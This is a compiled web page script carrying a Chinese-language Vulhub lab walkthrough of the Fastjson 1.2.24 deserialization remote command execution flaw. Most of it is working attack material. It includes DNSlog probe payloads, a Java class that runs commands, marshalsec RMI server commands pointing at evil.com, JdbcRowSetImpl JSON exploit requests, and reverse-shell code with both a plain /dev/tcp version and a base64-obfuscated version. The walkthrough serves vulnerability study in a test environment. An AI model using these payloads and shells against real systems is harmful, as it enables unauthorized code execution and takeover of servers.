import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as c,c as l,a as n,b as a,d as e,e as t}from"./app-58e4a7d6.js";const p={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),d=n("p",null,"Fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set/get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。",-1),r=n("p",null,"参考资料：",-1),v={href:"https://www.freebuf.com/vuls/208339.html",target:"_blank",rel:"noopener noreferrer"},m={href:"http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/",target:"_blank",rel:"noopener noreferrer"},k={href:"http://xxlegend.com/2017/04/29/title-",target:"_blank",rel:"noopener noreferrer"},b=t(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 运行测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境运行后，访问 <code>http://your-ip:8090</code> 即可看到 JSON 格式的输出。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202231112044.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>我们向这个地址 POST 一个 JSON 对象，即可更新服务端的信息：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl http://your-ip:8090/ -H &quot;Content-Type: application/json&quot; --data &#39;{&quot;name&quot;:&quot;hello&quot;, &quot;age&quot;:20}&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="如何判断一个站点是否存在-fastjson" tabindex="-1"><a class="header-anchor" href="#如何判断一个站点是否存在-fastjson" aria-hidden="true">#</a> 如何判断一个站点是否存在 Fastjson？</h2>`,8),g={href:"https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/",target:"_blank",rel:"noopener noreferrer"},h=t(`<p><strong>方式 1 响应时间</strong></p><p>正常数据响应时间（29 毫秒）：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202231411062.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>存在 Fastjson 时，16 进制数据响应时间明显变长（396 毫秒）：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202231408972.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><strong>方式 2 DNSlog</strong></p><p>最新版本 1.2.67 依然可以通过 dnslog 判断后端是否使用 fastjson</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}
{&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>因为目标环境是 Java 8u102，没有 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 的限制，我们可以使用 <code>com.sun.rowset.JdbcRowSetImpl</code> 的利用链，借助 JNDI 注入来执行命令。</p><p>首先编译并上传命令执行代码，如 <code>http://evil.com/TouchFile.class</code>：</p><p>执行 <code>javac TouchFile.java</code>，生成 <code>TouchFile.class</code>。</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token comment">// javac TouchFile.java</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Runtime</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Process</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TouchFile</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">Runtime</span> rt <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;touch&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;/tmp/success&quot;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token class-name">Process</span> pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>
            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// do nothing</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>通过 python 搭建一个临时的 web 服务，该服务是为了接收 LDAP 服务重定向请求，需要在 payload 的目录下开启此 web 服务，这样才可以访问到 payload 文件。此处 payload 文件即 <code>TouchFile.class</code>。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python -m http.server 8888
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,15),f={href:"https://github.com/mbechler/marshalsec",target:"_blank",rel:"noopener noreferrer"},x=n("code",null,"TouchFile.class",-1),q=t(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ git clone https://github.com/mbechler/marshalsec.git
$ mvn clean package -DskipTests
$ cp ./target/marshalsec-0.0.3-SNAPSHOT-all.jar /home/kali/vulnerability/vulhub/fastjson/1.2.24-rce
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>$ <span class="token function">java</span> <span class="token parameter variable">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="token string">&quot;http://evil.com:8888/#TouchFile&quot;</span> <span class="token number">9999</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202231224191.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>向靶场服务器发送 Payload，带上 RMI 的地址，注意 Content-Type 应该是 <code>application/json</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST / HTTP/1.1
Host: your-ip:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 160

{
    &quot;b&quot;:{
        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
        &quot;dataSourceName&quot;:&quot;rmi://evil.com:9999/TouchFile&quot;,
        &quot;autoCommit&quot;:true
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202231224531.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可见，命令 <code>touch /tmp/success</code> 已成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202231224373.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="反弹-shell" tabindex="-1"><a class="header-anchor" href="#反弹-shell" aria-hidden="true">#</a> 反弹 shell</h3><p>同样，执行 <code>javac TouchFile.java</code>，生成 <code>TouchFile.class</code>。</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token comment">// javac TouchFile.java</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Runtime</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Process</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TouchFile</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">Runtime</span> rt <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;exec 5&lt;&gt;/dev/tcp/192.168.174.128/9999;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token class-name">Process</span> pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>
            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// do nothing</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>也可以使用 bash base64 的方式：</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;bash&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;{echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMTQ3LjEyNy85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}&quot;</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动一个 RMI 服务器，监听 8888 端口，并制定加载远程类 <code>TouchFile.class</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://evil.com/#TouchFile&quot; 8888
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>发送 POST 请求包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST / HTTP/1.1
Host: 192.168.174.128:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 165

{
    &quot;b&quot;:{
        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
        &quot;dataSourceName&quot;:&quot;rmi://192.168.174.128:8888/TouchFile&quot;,
        &quot;autoCommit&quot;:true
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>监听 9999 端口，接收反弹 shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202231257183.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,19);function _(j,y){const s=i("ExternalLinkIcon");return c(),l("div",null,[u,d,r,n("ul",null,[n("li",null,[n("a",v,[a("https://www.freebuf.com/vuls/208339.html"),e(s)])]),n("li",null,[a("["),n("a",m,[a("http://xxlegend.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/"),e(s)]),a("]("),n("a",k,[a("http://xxlegend.com/2017/04/29/title-"),e(s)]),a(" fastjson 远程反序列化 poc 的构造和分析/)")])]),b,n("ul",null,[n("li",null,[a("参考阅读："),n("a",g,[a("https://zeo.cool/2020/07/04/红队武器库!fastjson小于1.2.68全漏洞RCE利用exp/"),e(s)])])]),h,n("p",null,[a("然后我们借助 "),n("a",f,[a("marshalsec"),e(s)]),a(" 项目，启动一个 RMI 服务器，监听 9999 端口，并制定加载远程类 "),x,a("。")]),q])}const T=o(p,[["render",_],["__file","Fastjson 1.2.24 反序列化导致任意命令执行漏洞.html.vue"]]);export{T as default};
